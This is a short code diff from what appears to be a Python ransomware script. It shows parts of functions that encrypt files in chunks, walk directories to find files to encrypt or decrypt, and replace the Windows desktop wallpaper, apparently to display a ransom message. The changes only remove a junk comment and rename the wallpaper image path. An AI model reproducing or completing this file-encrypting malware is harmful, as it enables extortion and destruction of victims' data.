@@ -30,7 +30,7 @@ def enc_file(base, in_filename, out_filename, chunksize=64*1024):
                     chunk += b' ' * (16 - len(chunk) % 16)
 
                 outfile.write(encryptor.encrypt(chunk))
-#dfsfsdfsdfsdfsdfsdfsfs
+
 def search_enc(path):
     try:
         files = os.listdir(path)
@@ -83,7 +83,7 @@ def search_dec(path):
 
 def change_bg():
     dir = ''
-    imagePath = 'C:/Users/tmdgh/Desktop/윾즉2.jpg'
+    imagePath = 'C:/Users/tmdgh/Desktop/test.jpg'
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)
 
